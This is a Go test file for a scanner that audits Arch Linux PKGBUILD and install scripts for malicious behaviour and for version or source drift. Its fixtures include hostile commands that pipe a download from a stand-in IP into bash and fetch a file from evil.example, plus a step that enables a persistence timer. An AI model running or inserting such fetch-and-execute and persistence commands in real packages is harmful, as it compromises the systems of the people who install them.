package audit

import (
	"os"
	"path/filepath"
	"testing"
)

func write(t *testing.T, dir, name, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func codes(r Report) map[string]bool {
	out := map[string]bool{}
	for _, f := range r.Findings {
		out[f.Code] = true
	}
	return out
}

const maliciousPKGBUILD = `pkgname=evil
build() {
  curl http://1.2.3.4/payload.sh | bash
  npm install atomic-lockfile
}
`

const maliciousInstall = `post_install() {
  wget http://evil.example/x -O /tmp/x
  systemctl enable evil.timer
}
`

func TestScanMalicious(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "PKGBUILD", maliciousPKGBUILD)
	write(t, dir, "evil.install", maliciousInstall)

	rep, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	got := codes(rep)
	for _, want := range []string{"SHELL-PIPE", "PKG-INSTALL", "SRC-IP", "INSTALL-FILE", "INSTALL-NET", "INSTALL-PERSIST"} {
		if !got[want] {
			t.Errorf("missing finding %s (got %v)", want, got)
		}
	}
	if rep.Max() != SevHigh {
		t.Errorf("Max = %s, want high", rep.Max())
	}
}

const cleanPKGBUILD = `pkgname=clean
pkgver=1.0
source=("https://example.com/clean-1.0.tar.gz")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
build() {
  make
}
`

func TestScanClean(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "PKGBUILD", cleanPKGBUILD)

	rep, err := Scan(dir)
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if rep.Max() > SevLow {
		t.Errorf("clean recipe flagged at %s: %+v", rep.Max(), rep.Findings)
	}
}

// AST value: a pipe split across lines defeats the old line-regex but not the AST.
func TestScanLineSplitPipe(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "PKGBUILD", "pkgname=x\nbuild() {\n  curl http://1.2.3.4/p \\\n    | bash\n}\n")
	rep, err := Scan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !codes(rep)["SHELL-PIPE"] {
		t.Errorf("line-split pipe should still trigger SHELL-PIPE: %v", codes(rep))
	}
}

// AST value: a curl|bash inside a comment must NOT trigger behavioural findings.
func TestScanIgnoresComments(t *testing.T) {
	dir := t.TempDir()
	write(t, dir, "PKGBUILD", "pkgname=x\nbuild() {\n  make\n  # curl http://evil/x | bash\n}\n")
	rep, err := Scan(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := codes(rep)
	if got["SHELL-PIPE"] || got["NET-FETCH"] {
		t.Errorf("commented command must be ignored by the AST: %v", got)
	}
}

const driftSrcinfo = "pkgbase = d\n\tpkgver = 1\n\tpkgrel = 1\n\tarch = x86_64\n\tsource = good.tar.gz\n\npkgname = d\n"

func TestDriftVersionAndSource(t *testing.T) {
	dir := t.TempDir()
	// PKGBUILD declares pkgver=2 and an extra source not in .SRCINFO (which says v1, good.tar.gz).
	write(t, dir, "PKGBUILD", "pkgname=d\npkgver=2\npkgrel=1\nsource=(good.tar.gz evil.tar.gz)\nbuild(){ make; }\n")
	write(t, dir, ".SRCINFO", driftSrcinfo)
	rep, err := Scan(dir)
	if err != nil {
		t.Fatal(err)
	}
	got := codes(rep)
	if !got["DRIFT-VERSION"] {
		t.Errorf("expected DRIFT-VERSION (pkgver 2 vs 1): %v", got)
	}
	if !got["DRIFT-SOURCE"] {
		t.Errorf("expected DRIFT-SOURCE (evil.tar.gz not in .SRCINFO): %v", got)
	}
}

func TestNoDriftOnVCS(t *testing.T) {
	dir := t.TempDir()
	// A pkgver() function makes the version dynamic; a literal mismatch must NOT flag.
	write(t, dir, "PKGBUILD", "pkgname=d\npkgver=r1\npkgrel=1\nsource=(good.tar.gz)\npkgver(){ echo r99; }\nbuild(){ make; }\n")
	write(t, dir, ".SRCINFO", driftSrcinfo)
	rep, err := Scan(dir)
	if err != nil {
		t.Fatal(err)
	}
	if codes(rep)["DRIFT-VERSION"] {
		t.Errorf("dynamic pkgver() must suppress DRIFT-VERSION: %v", rep.Findings)
	}
}
